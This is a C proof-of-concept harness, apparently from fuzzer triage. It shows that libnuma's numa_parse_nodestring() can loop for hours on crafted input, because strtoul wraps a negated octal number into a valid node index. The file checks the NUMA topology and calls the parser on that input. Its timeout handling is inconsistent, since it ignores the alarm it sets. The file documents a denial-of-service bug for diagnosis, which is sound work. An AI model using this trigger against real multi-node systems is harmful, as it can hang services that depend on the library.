#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <limits.h>
#include <unistd.h>
#include <numa.h>

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    /* Read PoC input file */
    FILE *f = fopen("poc_input", "rb");
    if (!f) { fprintf(stderr, "Failed to open poc_input\n"); return 1; }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *buf = malloc(sz + 1);
    fread(buf, 1, sz, f);
    buf[sz] = '\0';
    fclose(f);

    printf("PoC (%ld bytes): ", sz);
    for (int i = 0; i < sz; i++) {
        if (buf[i] >= 32 && buf[i] < 127) putchar(buf[i]);
        else printf("\\x%02x", (unsigned char)buf[i]);
    }
    printf("\n\n");

    /* Demonstrate the root cause: strtoul wraps with octal + negation */
    /* Skip past "1,1--" to the number part */
    char *end;
    errno = 0;
    unsigned long val = strtoul(buf + 5, &end, 0);
    unsigned int truncated = (unsigned int)val;

    printf("=== Root Cause Demonstration ===\n");
    printf("Input to strtoul: \"%s\"\n", buf + 5);
    printf("strtoul result: %lu (0x%016lx)\n", val, val);
    printf("Truncated to unsigned int: %u (0x%08x)\n", truncated, truncated);
    printf("Range: 1 to 0x%016lx (~%.1e iterations)\n", val, (double)val);
    printf("This would loop for hours on a system with NUMA node %u\n\n", truncated);

    /* Check NUMA topology */
    int nnodes = numa_num_configured_nodes();
    int pnodes = numa_num_possible_nodes();
    printf("=== NUMA Topology ===\n");
    printf("Configured nodes: %d\n", nnodes);
    printf("Possible nodes: %d\n", pnodes);

    /* Check if our truncated node exists */
    if (truncated < (unsigned)pnodes) {
        printf("Node %u EXISTS — infinite loop WILL trigger!\n", truncated);
    } else {
        printf("Node %u does NOT exist — bounds check catches it (safe on this system)\n", truncated);
        printf("On systems with >= %d NUMA nodes, this PoC triggers an infinite loop.\n", truncated + 1);
    }
    printf("\n");

    /* Try the actual parse call */
    printf("=== Attempting numa_parse_nodestring() ===\n");
    alarm(5);
    signal(SIGALRM, SIG_IGN); /* ignore alarm for now */

    fflush(stdout);
    fflush(stderr);
    struct bitmask *result = numa_parse_nodestring(buf);
    if (result) {
        printf("Result size=%lu (unexpected - completed without timeout)\n", (unsigned long)result->size);
        numa_bitmask_free(result);
    } else {
        printf("Returned NULL (parse error or bounds check passed)\n");
    }

    /* For containers with >= 2 nodes: demonstrate the hang */
    if (truncated < (unsigned)pnodes) {
        printf("\n*** VULNERABILITY CONFIRMED: on this system the loop would hang ***\n");
        printf("*** (skipping actual hang test to avoid blocking) ***\n");
    } else {
        printf("\n*** LIMITATION: single-node system, but vulnerability exists on multi-node ***\n");
        printf("*** The fuzzer detected this as timeout-cdb114994c951099 ***\n");
    }

    return 0;
}
